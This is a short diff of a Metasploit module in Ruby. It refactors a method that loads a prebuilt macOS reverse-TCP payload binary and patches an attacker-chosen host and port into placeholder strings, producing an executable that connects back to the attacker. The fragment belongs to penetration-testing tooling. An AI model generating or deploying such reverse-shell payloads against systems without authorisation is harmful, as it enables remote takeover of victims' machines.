@@ -65,11 +65,16 @@ module Metasploit3
   end
 
   def generate_macho
-    bin = File.read(File.join(Msf::Config.data_directory, 'osx', 'reverse_tcp_x86.bin'), {:mode => 'rb'})
-    #bin.sub!('XXXX127.0.0.1      ', "XXXX" + datastore['LHOST'].to_s + ' ' * (15-datastore['LHOST'].to_s.length)) if datastore['LHOST']
-    #bin.sub!('YYYY4444           ', "YYYY" + datastore['LPORT'].to_s + ' ' * (15-datastore['LPORT'].to_s.length)) if datastore['LPORT']
-    string_sub(bin, 'XXXX127.0.0.1      ', "XXXX" + datastore['LHOST'].to_s) if datastore['LHOST']
-    string_sub(bin, 'YYYY4444           ', "YYYY" + datastore['LPORT'].to_s) if datastore['LPORT']
-    return bin
+    bin = ::File.read(::File.join(Msf::Config.data_directory, 'osx', 'reverse_tcp_x86.bin'), {:mode => 'rb'})
+    
+    if datastore['LHOST']
+      bin = string_sub(bin, 'XXXX127.0.0.1      ', "XXXX" + datastore['LHOST'].to_s)
+    end
+    
+    if datastore['LPORT']
+      bin = string_sub(bin, 'YYYY4444           ', "YYYY" + datastore['LPORT'].to_s)
+    end
+
+    bin
   end
 end
